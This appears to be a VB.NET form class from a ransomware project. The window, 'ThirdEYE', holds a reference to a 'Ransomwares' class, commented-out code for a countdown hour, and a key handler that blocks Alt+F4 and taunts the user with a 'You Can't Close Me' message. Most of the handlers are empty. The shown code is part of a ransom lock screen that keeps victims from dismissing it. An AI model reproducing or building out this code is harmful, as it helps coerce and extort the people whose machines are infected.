Public Class ThirdEYE
    Dim Rens As Ransomwares = New Ransomwares
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        ' Label2.Text = GetHour()
    End Sub

    Private Sub ThirdEYE_Load(sender As Object, e As EventArgs) Handles Me.Load

    End Sub

    Private Sub Label1_VisibleChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub ThirdEYE_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Lol!!!😅 😆 😄 You Can't Close Me", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            e.Handled = True
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

    End Sub

    'Private Shared Function GetHour() As Double
    'Return Ransomwares.hour
    ' End Function
End Class